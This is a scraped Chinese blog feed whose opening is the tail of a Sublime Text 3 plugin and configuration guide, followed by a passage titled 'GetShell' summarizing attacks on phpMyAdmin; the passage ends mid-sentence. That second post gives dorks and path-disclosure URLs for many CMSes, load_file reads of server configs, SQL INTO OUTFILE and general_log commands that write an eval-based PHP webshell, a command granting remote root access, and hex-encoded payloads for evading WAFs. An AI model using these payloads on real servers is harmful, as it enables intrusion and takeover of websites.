<code>Ctrl+b</code>等vim快捷键和Sublime Text3冲突了，<br>所以在这个配置文件里添加一句</p><p><code>&quot;vintage_ctrl_keys&quot;: true</code></p><p>附上<a href="https://www.cnblogs.com/hezhiyao/p/7624831.html" target="_blank" rel="noopener">vim入门教程</a>一份</p><p>代码如下：</p><pre><code>    &quot;vintage_ctrl_keys&quot;: true,    &quot;ignored_packages&quot;:    [        //注释掉开启vim模式        // &quot;Vintage&quot;    ],</code></pre><h2 id="批量修改"><a href="#批量修改" class="headerlink" title="批量修改"></a>批量修改</h2><p>单个文件批量修改：纯相同的内容：选中需要修改的内容Alt+F3(Mac下默认的是Ctrl+Command+G) ，<br>或者连续 Ctrl+D（ 连续 Command+D(Mac) ) 之后重新写即可，使用Ctrl + U进行回退，使用Esc退出多重编辑。</p><h2 id="分屏操作"><a href="#分屏操作" class="headerlink" title="分屏操作"></a>分屏操作</h2><p>Windows下：<br>Alt + Shift + 2进行左右分屏，<br>Alt + Shift + 8进行上下分屏，<br>Alt + Shift + 5进行上下左右分屏（即分为四屏）。</p><h1 id="0x04-常用插件"><a href="#0x04-常用插件" class="headerlink" title="0x04 常用插件"></a>0x04 常用插件</h1><p>新版的sublime已经默认安装了package control，直接一手<code>ctrl+shift+p</code><br>输入框中输入<code>install</code>，点击列表中的<code>Package control:install package</code><br>稍等片刻，弹出列表，即可搜索插件安装。<br>（加载和安装的失败，多试几次，基本都是网络原因）</p><h2 id="主题插件-—-Material-Theme"><a href="#主题插件-—-Material-Theme" class="headerlink" title="主题插件 — Material Theme"></a>主题插件 — Material Theme</h2><p>搜索安装之后在<br><code>Preference -&gt; Settings -&gt; User</code> 里面复制如下配置：<br>也可以去<a href="https://github.com/equinusocio/material-theme" target="_blank" rel="noopener">Material Theme</a>的GitHub仓库查看主题配置说明，自己配置</p><pre><code>{    &quot;always_show_minimap_viewport&quot;: true,    &quot;bold_folder_labels&quot;: true,    &quot;color_scheme&quot;: &quot;Packages/Material Theme/schemes/Material-Theme.tmTheme&quot;,    &quot;fade_fold_buttons&quot;: false,    &quot;font_options&quot;:    [        &quot;gray_antialias&quot;    ],    &quot;font_size&quot;: 15,    &quot;ignored_packages&quot;:    [        &quot;Vintage&quot;    ],    &quot;indent_guide_options&quot;:    [        &quot;draw_normal&quot;,        &quot;draw_active&quot;    ],    &quot;line_padding_bottom&quot;: 3,    &quot;line_padding_top&quot;: 3,    &quot;material_theme_accent_scrollbars&quot;: true,    &quot;material_theme_arrow_folders&quot;: false,    &quot;material_theme_big_fileicons&quot;: true,    &quot;material_theme_bold_tab&quot;: true,    &quot;material_theme_bright_scrollbars&quot;: true,    &quot;material_theme_bullet_tree_indicator&quot;: true,    &quot;material_theme_compact_panel&quot;: true,    &quot;material_theme_compact_sidebar&quot;: true,    &quot;material_theme_contrast_mode&quot;: true,    &quot;material_theme_disable_folder_animation&quot;: false,    &quot;material_theme_disable_tree_indicator&quot;: true,    &quot;material_theme_panel_separator&quot;: true,    &quot;material_theme_small_statusbar&quot;: true,    &quot;material_theme_small_tab&quot;: true,    &quot;material_theme_tabs_autowidth&quot;: false,    &quot;material_theme_tabs_separator&quot;: false,    &quot;material_theme_tree_headings&quot;: true,    &quot;overlay_scroll_bars&quot;: &quot;enabled&quot;,    &quot;show_encoding&quot;: true,    &quot;show_line_endings&quot;: true,    &quot;theme&quot;: &quot;Material-Theme.sublime-theme&quot;}</code></pre><h2 id="透明插件-—-Transparency"><a href="#透明插件-—-Transparency" class="headerlink" title="透明插件 — Transparency"></a>透明插件 — Transparency</h2><p>仅支持windows系统，直接搜索<code>Transparency</code>在线安装即可实现透明<br>在<code>View -&gt; Windows&#39;s Transparency</code> 即可调整透明等级</p><h2 id="代码补全-—-Anaconda"><a href="#代码补全-—-Anaconda" class="headerlink" title="代码补全 — Anaconda"></a>代码补全 — Anaconda</h2><p>python代码补全</p><p><code>=&gt;Preferences=&gt;Package setting=&gt; Anaconda =&gt;Setting -User</code></p><pre><code>{    //Python路径    &quot;python_interpreter&quot;: &quot;C:/Users/AppData/Local/Programs/Python/Python36-32/python.exe&quot;,    //忽略各种空格不对, 超过79字, import的函数没有使用的提醒,    &quot;pep8_ignore&quot;: [&quot;E501&quot;, &quot;W292&quot;, &quot;E303&quot;, &quot;W391&quot;, &quot;E225&quot;, &quot;E302&quot;, &quot;W293&quot;, &quot;E402&quot;],    &quot;pyflakes_explicit_ignore&quot;:    [        &quot;UnusedImport&quot;    ],    //保存文件后自动pep8格式化    &quot;auto_formatting&quot;: true,    &quot;auto_formatting_timeout&quot;: 5,    //库函数的提示    &quot;enable_signatures_tooltip&quot;: true,    &quot;merge_signatures_and_doc&quot;:true,    //ST3也有自动补全提示，但只提示文件中输入过的单词，这个功能可用提示变量可用的函数等。    &quot;suppress_word_completions&quot;: true,    &quot;suppress_explicit_completions&quot;: true,    &quot;complete_parameters&quot;: true,    //代码排版时，行的默认长度太短，根据喜好设置    &quot;pep8_max_line_length&quot;: 120,}</code></pre><h2 id="调试插件-—-SublimeREPL"><a href="#调试插件-—-SublimeREPL" class="headerlink" title="调试插件 — SublimeREPL"></a>调试插件 — SublimeREPL</h2><p>安装好后，点击<code>Preferences -&gt; Browse Packages</code><br>找到<code>SublimeREPL\config\Python\Main.sublime-menu</code>文件，<br>然后用Sublime Text 3 打开，找到如图所示行，<br>修改为<code>&quot;cmd&quot;: [&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;,&quot;$file_basename&quot;]</code>，保存。<br>这样相当于将SublimeREPL的python交互环境的命令改为运行当前文件的交互环境。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190901005107.png" alt></p><p>然后设置快捷键 <code>Preferences -&gt; Key Bindings</code><br>如下<code>shift+f10</code>运行  <code>shift+f9</code>调试，可以修改为自己喜欢的快捷键<br>配合分屏操作，体验极佳</p><pre><code>[    {    &quot;keys&quot;: [&quot;shift+f10&quot;],    &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;,    &quot;command&quot;: &quot;run_existing_window_command&quot;,    &quot;args&quot;: {        &quot;id&quot;: &quot;repl_python_run&quot;,        &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;}    },    {    &quot;keys&quot;: [&quot;shift+f9&quot;],    &quot;caption&quot;: &quot;SublimeREPL: Python - PDB current file&quot;,    &quot;command&quot;: &quot;run_existing_window_command&quot;,    &quot;args&quot;: {        &quot;id&quot;: &quot;repl_python_pdb&quot;,        &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;}    },]</code></pre><blockquote><p>如果使用快捷键运行Python文件如果出现如下报错：<br><code>[&#39;$file_basename&#39;: [Errno 2] No such file or directory]</code><br>原因是当你使用<code>shift+f10</code>执行了一次之后，焦点已经不再当前执行的<code>.py</code>文件上了<br>点击要执行的<code>.py</code>文件，再执行就ok</p></blockquote><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190901011958.png" alt></p><p><strong>pdb 常用命令</strong></p><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">break 或 b</td><td align="center">设置断点</td></tr><tr><td align="center">continue 或 c</td><td align="center">继续执行程序</td></tr><tr><td align="center">list 或 l</td><td align="center">查看当前行的代码段</td></tr><tr><td align="center">step 或 s</td><td align="center">进入函数</td></tr><tr><td align="center">return 或 r</td><td align="center">执行代码直到从当前函数返回</td></tr><tr><td align="center">exit 或 q</td><td align="center">中止并退出</td></tr><tr><td align="center">next 或 n</td><td align="center">执行下一行</td></tr><tr><td align="center">pp</td><td align="center">打印变量的值</td></tr><tr><td align="center">help</td><td align="center">帮助</td></tr></tbody></table><h2 id="注释插件-—-DocBlockr"><a href="#注释插件-—-DocBlockr" class="headerlink" title="注释插件 — DocBlockr"></a>注释插件 — DocBlockr</h2><p>这个插件可以自动生成函数类型、参数个数及类型、函数返回值等<br>在函数上方输入<code>/**</code>，回车即可</p><p>python可以安装<code>DocBlockr python</code><br>在函数里输入<code>&#39;&#39;&#39;</code>回车即可</p><h2 id="终端插件-—-Terminal"><a href="#终端插件-—-Terminal" class="headerlink" title="终端插件 — Terminal"></a>终端插件 — Terminal</h2><p>快捷键 <code>ctrl+shift+t</code> <code>ctrl+alt+shift+t</code><br>安装好后，修改如下配置文件<br><code>=&gt;Preferences=&gt;Package setting=&gt;Terminal=&gt;Setting -User</code></p><pre><code>{    &quot;terminal&quot;: &quot;C:\\windows\\system32\\cmd.exe&quot;,     &quot;parameters&quot;: [&quot;/START&quot;,&quot;%CWD%&quot;]}</code></pre><h2 id="右键菜单增强-—-SideBarEnhancements"><a href="#右键菜单增强-—-SideBarEnhancements" class="headerlink" title="右键菜单增强 — SideBarEnhancements"></a>右键菜单增强 — SideBarEnhancements</h2><p>增强右键菜单功能：<br>在资源管理器中打开、新建文件、新建文件夹、以…打开、在浏览器中打开等等<br>可以配置在浏览器中打开快捷键<br>这里设置按Ctrl+Shift+C复制文件路径，按F2即可在Chrome浏览器预览效果<br>(如果需要的话，也可以根据自己的需要为Firefox，Safari，IE，Opera等加上)，<br>当然你也可以自己定义喜欢的快捷键，最后注意代码中的浏览器路径要以自己电脑里的文件路径为准。</p><p><code>preferences-&gt;package setting-&gt;side bar-&gt;Key Building-User</code></p><pre><code>[    { &quot;keys&quot;: [&quot;ctrl+shift+c&quot;], &quot;command&quot;: &quot;copy_path&quot; },    //chrome    { &quot;keys&quot;: [&quot;f2&quot;], &quot;command&quot;: &quot;side_bar_files_open_with&quot;,            &quot;args&quot;: {                &quot;paths&quot;: [],                &quot;application&quot;: &quot;C:\\Users\\jeffj\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe&quot;,                &quot;extensions&quot;:&quot;.*&quot;            }     }]</code></pre><h2 id="新建文件模板-—-FileHeader"><a href="#新建文件模板-—-FileHeader" class="headerlink" title="新建文件模板 — FileHeader"></a>新建文件模板 — FileHeader</h2><p>功能强大，自动的监测创建新文件动作，自动根据类型  添加模板。<br>几乎支持所有的编程语言，并且支持用户自定义语言。<br>能够自动的更新文件最后修改时间。<br>能够自动的更新文件最后的修改者。<br>不仅支持创建已经使用模板初始化好的文件，而且支持将header添加到已经存在的文件头部，并且支持批量添加。</p><p>设置默认文件模板:</p><p><code>=&gt;Preferences=&gt;Package setting=&gt;FileHeader=&gt;Setting -User</code></p><pre><code>{    &quot;Default&quot;:{        &quot;email&quot;:&quot;xxxx@qq.com&quot;,        &quot;last_modified_by&quot;:&quot;小红&quot;,        &quot;author&quot;:&quot;小明&quot;    }}</code></pre><p>设置对应文件模板:</p><p><code>Preferences -&gt; Browse Packages</code></p><p>进入<code>FileHeader\template\header</code>目录，<br>找到你想要添加头文件的语言对应的<code>.tmpl</code>文件修改即可</p><h2 id="快速创建文件-—-advancedNewFile"><a href="#快速创建文件-—-advancedNewFile" class="headerlink" title="快速创建文件 — advancedNewFile"></a>快速创建文件 — advancedNewFile</h2><p>快捷键<code>ctrl+alt+n</code><br>在弹出的输入框里输入我们需要新建的文件名回车即可,<br>默认路径为当前文件夹下，如果当前没有目录则会存到用户家目录<br>也可以带路径输入<code>test/test.py</code><br>（如果不确定路径，可以在输入框下方小字查看完整路径）</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jianshu.com/p/3cb5c6f2421c/" target="_blank" rel="noopener">如何优雅地使用Sublime Text3 - 简书</a><br><a href="https://www.jianshu.com/p/73304373539f" target="_blank" rel="noopener">（干货）自定义使用Sublime Text 3 - 简书</a><br><a href="https://www.cnblogs.com/JackyXu2018/p/8821482.html" target="_blank" rel="noopener">SubLime Text 3 配置SublimeREPL来交互式调试程序</a><br><a href="https://www.cnblogs.com/zhaof/p/8126306.html" target="_blank" rel="noopener">让你用sublime写出最完美的python代码–windows环境</a><br><a href="https://blog.csdn.net/zxy987872674/article/details/81707241" target="_blank" rel="noopener">sublime text 3 打造python3环境（代码自动补全，运行程序，高亮显示）</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sublime Text3 </tag>
            
            <tag> 透明美化 </tag>
            
            <tag> python </tag>
            
            <tag> 插件 </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—GetShell</title>
      <link href="/2019/08/28/xue-xi-zong-jie-pian-getshell/"/>
      <url>/2019/08/28/xue-xi-zong-jie-pian-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>各种GetShell总结</p><h1 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传"></a>0x01 文件上传</h1><p><a href="https://dylan903.coding.me/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/">upload-labs文件上传漏洞练习</a></p><h1 id="0x02-phpMyAdmin-GetShell"><a href="#0x02-phpMyAdmin-GetShell" class="headerlink" title="0x02 phpMyAdmin GetShell"></a>0x02 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p><h3 id="phpinfo获取网站路径"><a href="#phpinfo获取网站路径" class="headerlink" title="phpinfo获取网站路径"></a>phpinfo获取网站路径</h3><h4 id="收集网站部署使用的套件信息"><a href="#收集网站部署使用的套件信息" class="headerlink" title="收集网站部署使用的套件信息"></a>收集网站部署使用的套件信息</h4><p>常见未删除phpinfo页面</p><ul><li>phpinfo.php</li><li>info.php</li><li>1.php</li><li>test.php</li></ul><p>常见未删除探针页面</p><ul><li>l.php</li><li>iProber2.php</li><li>p.php</li><li>tanzhen.php</li><li>tz.php</li><li>u.php</li><li>xprober.php</li></ul><p>常见未删除测试文件</p><ul><li>test.php</li><li>ceshi.php</li><li>info.php</li><li>phpinfo.php</li><li>php_info.php</li><li>1.php</li></ul><h4 id="爬行遍历收集"><a href="#爬行遍历收集" class="headerlink" title="爬行遍历收集"></a>爬行遍历收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p><h4 id="爆破扫描收集"><a href="#爆破扫描收集" class="headerlink" title="爆破扫描收集"></a>爆破扫描收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p><h3 id="Google语法爆路径"><a href="#Google语法爆路径" class="headerlink" title="Google语法爆路径"></a>Google语法爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。<br>注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p><pre><code>Site:xxx.edu.tw warningSite:xxx.com.tw “fatal error”</code></pre><h3 id="配置文件读取网站路径"><a href="#配置文件读取网站路径" class="headerlink" title="配置文件读取网站路径"></a>配置文件读取网站路径</h3><p>关键字：<strong>web套件配置文件默认路径</strong></p><p> <code>load_file()</code>函数读取配置文件<br><strong>读取配置文件httpd.conf 或vhosts.conf！！！</strong></p><p>通过常用的web容器套件，来获取默认的网站可写路径信息，<br>如常用套件：xampp、phpnow、phpstudy等。</p><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>在通过web套件已经猜解到网站的默认路径后，经常会遇到向套件默认目录写入一句话后，无法成功的情况。</p><ul><li><p>情况一：<br>一句话写入成功，但是此目录并不是渗透对象的网站根目录，<br>我们无法通过URL地址访问到“我们写入的一句话木马”；</p></li><li><p>情况二：<br>还有一种情况，就是对于套件默认路径，我们没有写入的权限。<br>最常见的案例就是，我们渗透的网站服务器的系统是linux主机，而没有写入权限。</p></li></ul><ul><li>情况三：<br>再有一种情况就是，目标站点有相应的安全防护如杀毒软件、安全狗、或者IPS、WAF一类的应用防护，<br>导致无法成功写入一句话。对于这种有应用防护的原理，基本一致，都是基于特征检测的方式进行安全防护，<br>如单一特征、多特征防护。那么绕过这些安全防护的方法就是使用变种，如对提交内容进行编码混淆或者采用非敏感的函数等，<br>关于木马绕过技术不在文中扩展说明。</li></ul><p>对于以上“情况一”与“情况二”不能写入成功问题的解决思路，需要满足以下两个条件即可完美解决。</p><p><strong>找到可写的网站路径</strong><br><strong>且可写路径为渗透站点的物理路径，能够被正常的URL访问解析`</strong></p><p>而对于要满足以上的条件，最好的办法，就是通过读取web套件中间件的配置文件信息，获取网站的真实物理路径（如：httpd.conf）。<br>如在获知目标站点使用的xampp套件的情况，下我们可以直接利用phpmyadmin有root登录权限的条件下，<br>直接读取默认配置文件httpd.conf，通过配置文件httpd.conf收集到网站的真实物理路径，<br>读取方法：</p><p><code>select load_file(&#39;D:/xampp/apache/conf/httpd.conf&#39;);</code></p><p>查看数据库目录<br><code>Select @@basedir</code><br>或者<br><code>select @@basedir</code></p><h4 id="Xampp套件"><a href="#Xampp套件" class="headerlink" title="Xampp套件"></a>Xampp套件</h4><p>网站默认路径：<br><code>$disk:/xampp/htdocs</code></p><p>其他可写入路径：<br><code>$disk:/xampp/phpmyadmin/</code><br><strong>注：xampp套件phpmyadmin目录如果没删除，也可以尝试直接写入操作；</strong></p><p>猜测默认apache默认配置文件路径，读取配置文件，查找网站根目录和可写目录路径；<br>Apache配置文件默认路径：</p><p>httpd.conf配置文件：<code>$disk:/xampp/apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/xampp/apache/conf/extra/httpd-vhosts.conf</code></p><h4 id="LAMPP套件"><a href="#LAMPP套件" class="headerlink" title="LAMPP套件"></a>LAMPP套件</h4><p>网站默认路径：<br><code>/opt/lampp/htdocs</code></p><p>Apache配置文件默认路径：<br>httpd.conf配置文件：<code>/opt/lampp/etc/httpd.conf</code><br>vhosts.conf虚拟主机：<code>/opt/lampp/etc/extra/httpd-vhosts.conf</code></p><h4 id="phpStudy套件"><a href="#phpStudy套件" class="headerlink" title="phpStudy套件"></a>phpStudy套件</h4><p>网站默认路径:</p><p><code>$disk:/phpstudy/www</code></p><p>Apache配置文件默认路径：</p><p>httpd.conf配置文件：<code>$disk:/phpStudy/Apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/phpStudy/Apache/conf/extra/httpd-vhosts.conf</code></p><h4 id="phpnow套件"><a href="#phpnow套件" class="headerlink" title="phpnow套件"></a>phpnow套件</h4><p>phpnow套件默认网站路径依据版本不同可能不同，<br>当前使用最新的版本是1.5.6，其默认目录：</p><p><code>$disk:\phpnow-1.5.6\htdocs</code></p><p>Apache配置文件默认路径：</p><p>httpd.conf配置文件：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.comf</code></p><h4 id="LNMP套件"><a href="#LNMP套件" class="headerlink" title="LNMP套件"></a>LNMP套件</h4><p>网站默认路径：</p><p><code>/home/wwwroot/default</code></p><h4 id="其他Web容器"><a href="#其他Web容器" class="headerlink" title="其他Web容器"></a>其他Web容器</h4><p>IIS6.0+win2003 配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:/Windows/system32/inetsrv/metabase.xml</code></p><p>IIS7.0+WINDOWS配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p><p>Linux:</p><p>配置文件:<br><code>/etc/php.ini php</code><br><code>/etc/httpd/conf.d/php.conf</code><br>配置文件:<br><code>/etc/httpd/conf/httpd.conf Apache</code><br><code>/usr/local/apache/conf/httpd.conf</code><br><code>/usr/local/apache2/conf/httpd.conf</code><br>虚拟目录配置文件:<br><code>/usr/local/apache/conf/extra/httpd-vhosts.conf</code></p><h3 id="错误页面爆网站路径"><a href="#错误页面爆网站路径" class="headerlink" title="错误页面爆网站路径"></a>错误页面爆网站路径</h3><p>特定目录报错！！！</p><h4 id="Phpmyadmin暴路径"><a href="#Phpmyadmin暴路径" class="headerlink" title="Phpmyadmin暴路径"></a>Phpmyadmin暴路径</h4><p>一般在获取phpmyadmin管理页面后，特定的版本访问特点的目录，可以爆出网站的物理路径。</p><ol><li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li><li><code>/phpMyAdmin/index.php?lang[]=1</code></li><li><code>/phpMyAdmin/phpinfo.php</code></li><li><code>/phpmyadmin/themes/darkblue_orange/layout.inc.php</code></li><li><code>/phpmyadmin/libraries/select_lang.lib.php</code></li><li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li><li><code>/phpmyadmin/libraries/mcrypt.lib.php</code></li></ol><h4 id="SQL注入点暴路径"><a href="#SQL注入点暴路径" class="headerlink" title="SQL注入点暴路径"></a>SQL注入点暴路径</h4><p>对于存在sql注入点的页面，可以尝试“加单引号”或者“构造错误参数”进行网站路径爆错显示。</p><p><code>www.xxx.com/news.php?id=149′</code><br><code>www.xxx.com/researcharchive.php?id=-1</code></p><h4 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h4><p>当我们遇到Web服务器是nginx，且存在文件类型解析漏洞时，可以在图片地址后加<code>/x.php</code>，<br>该图片不但会被当作<code>php</code>文件执行，还有可能爆出物理路径。</p><p><code>www.xyz.com/123.jpg/x.php</code></p><h4 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a>DeDeCms</h4><pre><code>/member/templets/menulit.php/plus/paycenter/alipay/return_url.php/plus/paycenter/cbpayment/autoreceive.php/paycenter/nps/config_pay_nps.php/plus/task/dede-maketimehtml.php/plus/task/dede-optimize-table.php/plus/task/dede-upcache.php</code></pre><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><pre><code>/wp-admin/includes/file.php/wp-content/themes/baiaogu-seo/footer.php</code></pre><h4 id="Ecshop商城系统暴路径漏洞文件"><a href="#Ecshop商城系统暴路径漏洞文件" class="headerlink" title="Ecshop商城系统暴路径漏洞文件"></a>Ecshop商城系统暴路径漏洞文件</h4><pre><code>/api/cron.php/wap/goods.php/temp/compiled/ur_here.lbi.php/temp/compiled/pages.lbi.php/temp/compiled/user_transaction.dwt.php/temp/compiled/history.lbi.php/temp/compiled/page_footer.lbi.php/temp/compiled/goods.dwt.php/temp/compiled/user_clips.dwt.php/temp/compiled/goods_article.lbi.php/temp/compiled/comments_list.lbi.php/temp/compiled/recommend_promotion.lbi.php/temp/compiled/search.dwt.php/temp/compiled/category_tree.lbi.php/temp/compiled/user_passport.dwt.php/temp/compiled/promotion_info.lbi.php/temp/compiled/user_menu.lbi.php/temp/compiled/message.dwt.php/temp/compiled/admin/pagefooter.htm.php/temp/compiled/admin/page.htm.php/temp/compiled/admin/start.htm.php/temp/compiled/admin/goods_search.htm.php/temp/compiled/admin/index.htm.php/temp/compiled/admin/order_list.htm.php/temp/compiled/admin/menu.htm.php/temp/compiled/admin/login.htm.php/temp/compiled/admin/message.htm.php/temp/compiled/admin/goods_list.htm.php/temp/compiled/admin/pageheader.htm.php/temp/compiled/admin/top.htm.php/temp/compiled/top10.lbi.php/temp/compiled/member_info.lbi.php/temp/compiled/bought_goods.lbi.php/temp/compiled/goods_related.lbi.php/temp/compiled/page_header.lbi.php/temp/compiled/goods_script.html.php/temp/compiled/index.dwt.php/temp/compiled/goods_fittings.lbi.php/temp/compiled/myship.dwt.php/temp/compiled/brands.lbi.php/temp/compiled/help.lbi.php/temp/compiled/goods_gallery.lbi.php/temp/compiled/comments.lbi.php/temp/compiled/myship.lbi.php/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php/includes/modules/cron/auto_manage.php/includes/modules/cron/ipdel.php</code></pre><h4 id="Ucenter爆路径"><a href="#Ucenter爆路径" class="headerlink" title="Ucenter爆路径"></a>Ucenter爆路径</h4><p><code>/ucenter/control/admin/db.php</code></p><h4 id="DZbbs"><a href="#DZbbs" class="headerlink" title="DZbbs"></a>DZbbs</h4><p><code>/manyou/admincp.php?my_suffix=%0A%0DTOBY57</code></p><h4 id="Z-blog"><a href="#Z-blog" class="headerlink" title="Z-blog"></a>Z-blog</h4><p><code>/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</code></p><h4 id="Php168爆路径"><a href="#Php168爆路径" class="headerlink" title="Php168爆路径"></a>Php168爆路径</h4><pre><code>/admin/inc/hack/count.php?job=list/admin/inc/hack/search.php?job=getcode/admin/inc/ajax/bencandy.php?job=do/cache/MysqlTime.txt</code></pre><p>PHPcms2008-sp4<br>注册用户登陆后访问<br><code>/phpcms/corpandresize/process.php?pic=../images/logo.gif</code></p><h4 id="CMSeasy爆网站路径漏洞"><a href="#CMSeasy爆网站路径漏洞" class="headerlink" title="CMSeasy爆网站路径漏洞"></a>CMSeasy爆网站路径漏洞</h4><p>漏洞出现在menu_top.php这个文件中</p><pre><code>/lib/mods/celive/menu_top.php/lib/default/ballot_act.php/lib/default/special_act.php</code></pre><h2 id="写入shell方法"><a href="#写入shell方法" class="headerlink" title="写入shell方法"></a>写入shell方法</h2><h3 id="写入条件"><a href="#写入条件" class="headerlink" title="写入条件"></a>写入条件</h3><p><strong>导出WebShell主要条件：</strong></p><ul><li>Root数据库用户（root权限）</li><li>网站绝对路径（确定有写入权限）</li><li>magic_quotes_gpc：Off（关闭）</li></ul><p><strong>导出WebShell其它条件：</strong></p><ul><li>magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。</li><li>secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。</li><li>file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。</li></ul><p><strong>写入权限</strong><br>查看能否自定义导出文件目录的权限</p><p><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/1541693041317.png" alt></p><p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br>并且这个值是只读变量，只能通过配置文件修改。</p><pre><code>show global variables like &quot;%secure%&quot;;      //查询secure_file_priv配置secure_file_prive=null              //不允许导入导出数据到目录secure_file_priv=c:\90sec            //允许导入导出数据到指定目录secure_file_priv=&#39;&#39;              //允许导入导出数据到任意目录secure_file_priv=&quot;/&quot;              //允许导入导出数据到任意目录</code></pre><p>注：<br>在<code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code>文件中找到<code>secure_file_prive</code><br>并将其值设置为<code>&quot;&quot;</code>或<code>&quot;/&quot;</code>，重启MySQL服务！</p><h3 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h3><p><strong>创建数据表导出shell</strong></p><pre><code>CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39;);SELECT `content` FROM `shadow9` INTO OUTFILE &#39;C:\\phpStudy\\WWW\\90sec.php&#39;;DROP TABLE IF EXISTS `shadow9`;</code></pre><p> <strong>一句话导出shell</strong></p><pre><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/90sec.php&#39;;  select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:\\phpstudy\\www\\90sec.php&#39;;select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into dumpfile &#39;c:\\phpstudy\\www\\bypass.php&#39;;</code></pre><p><strong>日志备份获取shell</strong></p><pre><code>show global variables like &quot;%genera%&quot;;          //查询general_log配置set global general_log=&#39;on&#39;;              //开启general log模式SET global general_log_file=&#39;D:/phpStudy/WWW/cmd.php&#39;;    //设置日志文件保存路径SELECT &#39;&lt;?php phpinfo();?&gt;&#39;;              //phpinfo()写入日志文件set global general_log=&#39;off&#39;;              //关闭general_log模式</code></pre><h3 id="绕过写入"><a href="#绕过写入" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截<br><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;     //开启MySQL外链</code><br><code>flush privileges;                      //刷新MySQL系统权限相关表</code></p><p>这里的这些技巧是从别人那边收集过来的 感谢！！！<br>绕过360 （通过内联注释）<br><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into /*!50001outfile*/ &#39;c:/phpstudy/www/bypass.php&#39;;</code></p><p>绕过网站安全狗&lt;4.0 （通过hex编码）</p><pre><code>select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>绕过安全狗4.0 通过hex编码+内联注释</p><pre><code>/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h3 id="绕过写入-1"><a href="#绕过写入-1" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>绕过server_sql.php、tbl_sql.php、db_sql.php + 